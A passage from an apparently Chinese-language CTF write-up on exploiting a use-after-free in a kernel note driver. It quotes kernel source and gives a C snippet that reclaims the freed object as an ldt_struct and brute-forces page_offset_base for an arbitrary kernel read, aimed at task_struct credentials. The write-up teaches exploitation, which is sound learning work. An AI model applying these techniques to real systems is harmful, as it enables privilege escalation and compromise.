<h4 id="SELECT"><a href="#SELECT" class="headerlink" title="SELECT"></a>SELECT</h4><p>request = 0x6666，复制指定 index 的指针到全局变量 note 里<br><img src="/images/5b4f46e3/pasted-3.png" alt="note select"></p>
<h4 id="EDIT"><a href="#EDIT" class="headerlink" title="EDIT"></a>EDIT</h4><p>request = 0x6669，向 note 指针处写入 8 字节的 value<br><img src="/images/5b4f46e3/pasted-2.png" alt="note edit"></p>
<h4 id="SHOW"><a href="#SHOW" class="headerlink" title="SHOW"></a>SHOW</h4><p>request = 0x666A，打印 note 指针指向的 8 字节值，但是前面有一些判断，其实就是判断当前用户是否为 root，只有为 root  才能用，所以这个功能没有用<br><img src="/images/5b4f46e3/pasted-4.png" alt="note show"><br><img src="/images/5b4f46e3/pasted-5.png" alt="note show print"></p>
<hr>
<p>显然这里存在一个 UAF，<strong>SELECT</strong> 后再 <strong>DELETE</strong>，此时 object 已经被释放，但是 <strong>EDIT</strong> 操作使用的 note 指针仍指向被释放的 object</p>
<h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><p>可以 UAF 32 字节的 object，且只能写入前 8 字节的数据</p>
<p>首先可以想到的就是劫持 <strong>seq_operations</strong> 结构体的 start 指针，利用 <strong>pt_regs</strong> 结构体进行 ROP</p>
<h3 id="modify-ldt"><a href="#modify-ldt" class="headerlink" title="modify_ldt"></a>modify_ldt</h3><p>但是还需要泄露内核地址，参考官方题解，了解到 <a href="https://elixir.bootlin.com/linux/v5.11.9/source/arch/x86/include/asm/mmu_context.h#L36"><code>ldt_struct</code></a> 这么一个结构体</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/*
 * ldt_structs can be allocated, used, and freed, but they are never
 * modified while live.
 */</span>
<span class="token keyword">struct</span> <span class="token class-name">ldt_struct</span> <span class="token punctuation">&#123;</span>
	<span class="token comment">/*
	 * Xen requires page-aligned LDTs with special permissions.  This is
	 * needed to prevent us from installing evil descriptors such as
	 * call gates.  On native, we could merge the ldt_struct and LDT
	 * allocations, but it's not worth trying to optimize.
	 */</span>
	<span class="token keyword">struct</span> <span class="token class-name">desc_struct</span>	<span class="token operator">*</span>entries<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>		nr_entries<span class="token punctuation">;</span>

	<span class="token comment">/*
	 * If PTI is in use, then the entries array is not mapped while we're
	 * in user mode.  The whole array will be aliased at the addressed
	 * given by ldt_slot_va(slot).  We use two slots so that we can allocate
	 * and map, and enable a new LDT without invalidating the mapping
	 * of an older, still-in-use LDT.
	 *
	 * slot will be -1 if this LDT doesn't have an alias mapping.
	 */</span>
	<span class="token keyword">int</span>			slot<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>大小为 32 字节，entries 指向 <a href="https://elixir.bootlin.com/linux/v5.11.9/source/arch/x86/include/asm/desc_defs.h#L16"><code>desc_struct</code></a> 段描述符：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* 8 byte segment descriptor */</span>
<span class="token keyword">struct</span> <span class="token class-name">desc_struct</span> <span class="token punctuation">&#123;</span>
	u16	limit0<span class="token punctuation">;</span>
	u16	base0<span class="token punctuation">;</span>
	u16	base1<span class="token operator">:</span> <span class="token number">8</span><span class="token punctuation">,</span> type<span class="token operator">:</span> <span class="token number">4</span><span class="token punctuation">,</span> s<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> dpl<span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> p<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">;</span>
	u16	limit1<span class="token operator">:</span> <span class="token number">4</span><span class="token punctuation">,</span> avl<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> l<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> d<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> g<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> base2<span class="token operator">:</span> <span class="token number">8</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>packed<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><del>不了解段描述符是什么东西的读者可以复习下操作系统课程</del></p>
<p>linux 还提供了一个系统调用<a href="https://elixir.bootlin.com/linux/v5.11.9/source/arch/x86/kernel/ldt.c#L659"><code>modify_ldt</code></a>来修改 <code>ldt_struct</code>：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">SYSCALL_DEFINE3</span><span class="token punctuation">(</span>modify_ldt<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token punctuation">,</span> func <span class="token punctuation">,</span> <span class="token keyword">void</span> __user <span class="token operator">*</span> <span class="token punctuation">,</span> ptr <span class="token punctuation">,</span>
		<span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token punctuation">,</span> bytecount<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token operator">-</span>ENOSYS<span class="token punctuation">;</span>

	<span class="token keyword">switch</span> <span class="token punctuation">(</span>func<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>
		ret <span class="token operator">=</span> <span class="token function">read_ldt</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> bytecount<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">break</span><span class="token punctuation">;</span>
	<span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>
		ret <span class="token operator">=</span> <span class="token function">write_ldt</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> bytecount<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">break</span><span class="token punctuation">;</span>
	<span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>
		ret <span class="token operator">=</span> <span class="token function">read_default_ldt</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> bytecount<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">break</span><span class="token punctuation">;</span>
	<span class="token keyword">case</span> <span class="token number">0x11</span><span class="token operator">:</span>
		ret <span class="token operator">=</span> <span class="token function">write_ldt</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> bytecount<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">break</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token comment">/*
	 * The SYSCALL_DEFINE() macros give us an 'unsigned long'
	 * return type, but tht ABI for sys_modify_ldt() expects
	 * 'int'.  This cast gives us an int-sized value in %rax
	 * for the return code.  The 'unsigned' is necessary so
	 * the compiler does not try to sign-extend the negative
	 * return codes into the high half of the register when
	 * taking the value from int->long.
	 */</span>
	<span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>ret<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>根据参数 func 来确定分别调用 <a href="https://elixir.bootlin.com/linux/v5.11.9/source/arch/x86/kernel/ldt.c#L494"><code>read_ldt</code></a>，<a href="https://elixir.bootlin.com/linux/v5.11.9/source/arch/x86/kernel/ldt.c#L570"><code>write_ldt</code></a> 等</p>
<p>ptr 是 <a href="https://elixir.bootlin.com/linux/v5.11.9/source/arch/x86/include/uapi/asm/ldt.h#L21"><code>user_desc</code></a> 结构体的指针：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">user_desc</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>  entry_number<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>  base_addr<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>  limit<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>  seg_32bit<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>  contents<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>  read_exec_only<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>  limit_in_pages<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>  seg_not_present<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>  useable<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__x86_64__</span></span>
	<span class="token comment">/*
	 * Because this bit is not present in 32-bit user code, user
	 * programs can pass uninitialized values here.  Therefore, in
	 * any context in which a user_desc comes from a 32-bit program,
	 * the kernel must act as though lm == 0, regardless of the
	 * actual value.
	 */</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>  lm<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="read-ldt"><a href="#read-ldt" class="headerlink" title="read_ldt"></a>read_ldt</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">read_ldt</span><span class="token punctuation">(</span><span class="token keyword">void</span> __user <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> bytecount<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token keyword">struct</span> <span class="token class-name">mm_struct</span> <span class="token operator">*</span>mm <span class="token operator">=</span> current<span class="token operator">-></span>mm<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> entries_size<span class="token punctuation">;</span>
	<span class="token keyword">int</span> retval<span class="token punctuation">;</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    
	entries_size <span class="token operator">=</span> mm<span class="token operator">-></span>context<span class="token punctuation">.</span>ldt<span class="token operator">-></span>nr_entries <span class="token operator">*</span> LDT_ENTRY_SIZE<span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>entries_size <span class="token operator">></span> bytecount<span class="token punctuation">)</span>
		entries_size <span class="token operator">=</span> bytecount<span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_to_user</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> mm<span class="token operator">-></span>context<span class="token punctuation">.</span>ldt<span class="token operator">-></span>entries<span class="token punctuation">,</span> entries_size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		retval <span class="token operator">=</span> <span class="token operator">-</span>EFAULT<span class="token punctuation">;</span>
		<span class="token keyword">goto</span> out_unlock<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
out_unlock<span class="token operator">:</span>
	<span class="token function">up_read</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mm<span class="token operator">-></span>context<span class="token punctuation">.</span>ldt_usr_sem<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> retval<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到使用 copy_to_user 从 entries 指针向用户空间拷贝数据</p>
<h4 id="write-ldt"><a href="#write-ldt" class="headerlink" title="write_ldt"></a>write_ldt</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">write_ldt</span><span class="token punctuation">(</span><span class="token keyword">void</span> __user <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> bytecount<span class="token punctuation">,</span> <span class="token keyword">int</span> oldmode<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token keyword">struct</span> <span class="token class-name">mm_struct</span> <span class="token operator">*</span>mm <span class="token operator">=</span> current<span class="token operator">-></span>mm<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">ldt_struct</span> <span class="token operator">*</span>new_ldt<span class="token punctuation">,</span> <span class="token operator">*</span>old_ldt<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> old_nr_entries<span class="token punctuation">,</span> new_nr_entries<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">user_desc</span> ldt_info<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">desc_struct</span> ldt<span class="token punctuation">;</span>
	<span class="token keyword">int</span> error<span class="token punctuation">;</span>

	error <span class="token operator">=</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>bytecount <span class="token operator">!=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>ldt_info<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">goto</span> out<span class="token punctuation">;</span>
	error <span class="token operator">=</span> <span class="token operator">-</span>EFAULT<span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ldt_info<span class="token punctuation">,</span> ptr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>ldt_info<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">goto</span> out<span class="token punctuation">;</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>oldmode <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>ldt_info<span class="token punctuation">.</span>base_addr <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>ldt_info<span class="token punctuation">.</span>limit<span class="token punctuation">)</span> <span class="token operator">||</span>
	    <span class="token function">LDT_empty</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ldt_info<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token comment">/* The user wants to clear the entry. */</span>
		<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ldt<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>ldt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ldt_info<span class="token punctuation">.</span>seg_32bit <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">allow_16bit_segments</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			error <span class="token operator">=</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>
			<span class="token keyword">goto</span> out<span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>

		<span class="token function">fill_ldt</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ldt<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ldt_info<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>oldmode<span class="token punctuation">)</span>
			ldt<span class="token punctuation">.</span>avl <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

	old_ldt       <span class="token operator">=</span> mm<span class="token operator">-></span>context<span class="token punctuation">.</span>ldt<span class="token punctuation">;</span>
	old_nr_entries <span class="token operator">=</span> old_ldt <span class="token operator">?</span> old_ldt<span class="token operator">-></span>nr_entries <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">;</span>
	new_nr_entries <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>ldt_info<span class="token punctuation">.</span>entry_number <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> old_nr_entries<span class="token punctuation">)</span><span class="token punctuation">;</span>

	error <span class="token operator">=</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>
	new_ldt <span class="token operator">=</span> <span class="token function">alloc_ldt_struct</span><span class="token punctuation">(</span>new_nr_entries<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>new_ldt<span class="token punctuation">)</span>
		<span class="token keyword">goto</span> out_unlock<span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>old_ldt<span class="token punctuation">)</span>
		<span class="token function">memcpy</span><span class="token punctuation">(</span>new_ldt<span class="token operator">-></span>entries<span class="token punctuation">,</span> old_ldt<span class="token operator">-></span>entries<span class="token punctuation">,</span> old_nr_entries <span class="token operator">*</span> LDT_ENTRY_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>

	new_ldt<span class="token operator">-></span>entries<span class="token punctuation">[</span>ldt_info<span class="token punctuation">.</span>entry_number<span class="token punctuation">]</span> <span class="token operator">=</span> ldt<span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>write_ldt 使用 <a href="https://elixir.bootlin.com/linux/v5.11.9/source/arch/x86/kernel/ldt.c#L149"><code>alloc_ldt_struct</code></a> 来分配 <code>ldt_struct</code>：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">ldt_struct</span> <span class="token operator">*</span><span class="token function">alloc_ldt_struct</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> num_entries<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
	new_ldt <span class="token operator">=</span> <span class="token function">kmalloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ldt_struct</span><span class="token punctuation">)</span><span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
	<span class="token keyword">return</span> new_ldt<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="Leak"><a href="#Leak" class="headerlink" title="Leak"></a>Leak</h3><p>利用 modify_ldt 系统调用，不难想到一个 leak 内核地址的思路</p>
<ol>
<li>ADD -&gt; SELECT -&gt; DELETE，构造 UAF</li>
<li>通过 write_ldt 分配到被释放的 object</li>
<li>EDIT 修改 entries 指针</li>
<li>read_ldt 即可读取数据</li>
</ol>
<p>由于 copy_to_user 访问无效的地址并不会造成内核 panic，只会返回非 0 值，最后导致 modify_ldt 返回 <code>-EFAULT</code>，我们可以直接爆破内核地址</p>
<p>但是因为开启了 <strong>HARDENED_USERCOPY</strong>，当 copy_to_user 拷贝源地址为内核 .text 地址会造成 panic，因此不能直接爆破内核地址</p>
<p>可以改而爆破 <code>direct mapping area</code>（线性映射区）的起始地址 <strong>page_offset_base</strong>，实际上大小为 1G，kmalloc 就是从这里分配内存，可以从这里搜索找到 task_struct 结构体，进一步泄露更多数据</p>
<h4 id="Bruteforce"><a href="#Bruteforce" class="headerlink" title="Bruteforce"></a>Bruteforce</h4><p>爆破 <strong>page_offset_base</strong> 模板：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">    <span class="token class-name">uint64_t</span> page_offset_base <span class="token operator">=</span> <span class="token number">0xffff888000000000uLL</span><span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
	<span class="token keyword">struct</span> <span class="token class-name">user_desc</span> desc<span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
	<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>desc<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>desc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    desc<span class="token punctuation">.</span>base_addr<span class="token operator">=</span><span class="token number">0xff0000</span><span class="token punctuation">;</span>
    desc<span class="token punctuation">.</span>entry_number<span class="token operator">=</span><span class="token number">0x8000</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">;</span>
    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> NOTE_ADD<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> NOTE_SELECT<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> NOTE_DELETE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token function">syscall</span><span class="token punctuation">(</span>SYS_modify_ldt<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>desc<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>desc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// new ldt_struct</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"searching page_offset_base..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> NOTE_EDIT<span class="token punctuation">,</span> page_offset_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">syscall</span><span class="token punctuation">(</span>SYS_modify_ldt<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>tmp<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            page_offset_base <span class="token operator">+=</span> <span class="token number">1</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">;</span>  <span class="token comment">// direct mapping size = 1G</span>
            <span class="token keyword">continue</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="Searching"><a href="#Searching" class="headerlink" title="Searching"></a>Searching</h4><p><a href="https://elixir.bootlin.com/linux/v5.11.9/source/include/linux/sched.h#L973"><code>task_struct</code></a>存在一些有用的字段：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token punctuation">&#123;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
	<span class="token comment">/* Process credentials: */</span>

	<span class="token comment">/* Tracer's credentials at attach: */</span>
	<span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">cred</span> __rcu		<span class="token operator">*</span>ptracer_cred<span class="token punctuation">;</span>

	<span class="token comment">/* Objective and real subjective task credentials (COW): */</span>
	<span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">cred</span> __rcu		<span class="token operator">*</span>real_cred<span class="token punctuation">;</span>

	<span class="token comment">/* Effective (overridable) subjective task credentials (COW): */</span>
	<span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">cred</span> __rcu		<span class="token operator">*</span>cred<span class="token punctuation">;</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
	<span class="token keyword">char</span>				comm<span class="token punctuation">[</span>TASK_COMM_LEN<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
	<span class="token keyword">struct</span> <span class="token class-name">files_struct</span>		<span class="token operator">*</span>files<span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>其中 comm 为进程的名字，可以通过  <code>prctl(PR_SET_NAME, &quot;myname&quot;)</code> 来设置，通过该字段就能定位到 task_struct 的位置</p>
<p>task_struct 还存在一个 files 字段，记录了进程打开的文件信息，结构体为 <a href="https://elixir.bootlin.com/linux/v5.11.9/source/include/linux/fdtable.h#L49"><code>files_struct</code></a>：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">files_struct</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">/*
   * read mostly part
   */</span>
	<span class="token class-name">atomic_t</span> count<span class="token punctuation">;</span>
	bool resize_in_progress<span class="token punctuation">;</span>
	<span class="token class-name">wait_queue_head_t</span> resize_wait<span class="token punctuation">;</span>

	<span class="token keyword">struct</span> <span class="token class-name">fdtable</span> __rcu <span class="token operator">*</span>fdt<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">fdtable</span> fdtab<span class="token punctuation">;</span>
  <span class="token comment">/*
   * written part on a separate cache line in SMP
   */</span>
	<span class="token class-name">spinlock_t</span> file_lock ____cacheline_aligned_in_smp<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> next_fd<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> close_on_exec_init<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> open_fds_init<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> full_fds_bits_init<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">file</span> __rcu <span class="token operator">*</span> fd_array<span class="token punctuation">[</span>NR_OPEN_DEFAULT<span class="token punctuation">]</span><span class="token punctuation">;</span>
